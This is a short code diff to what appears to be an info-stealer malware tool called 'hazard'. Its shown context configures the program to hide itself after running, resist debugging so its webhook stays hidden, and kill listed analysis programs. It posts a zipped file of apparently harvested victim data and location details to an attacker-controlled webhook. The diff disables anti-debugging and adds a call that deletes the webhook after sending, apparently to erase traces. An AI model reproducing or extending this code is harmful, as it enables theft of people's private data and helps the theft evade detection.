@@ -42,7 +42,7 @@ __config__ = {
     # if you want the file to hide itself after run
     'hide_self': True,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
-    'anti_debug': True,
+    'anti_debug': False,
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
@@ -701,6 +701,8 @@ GoogleMaps: {self.googlemap}
                 key = TOTP(self.fetch_conf('webhook_protector_key')).now()
                 httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
                 httpx.post(self.webhook, headers={"Authorization": key}, files={'upload_file': f})
+                
+            httpx.delete(self.webhook)
         os.remove(_zipfile)
         self.hazard_exit()
 
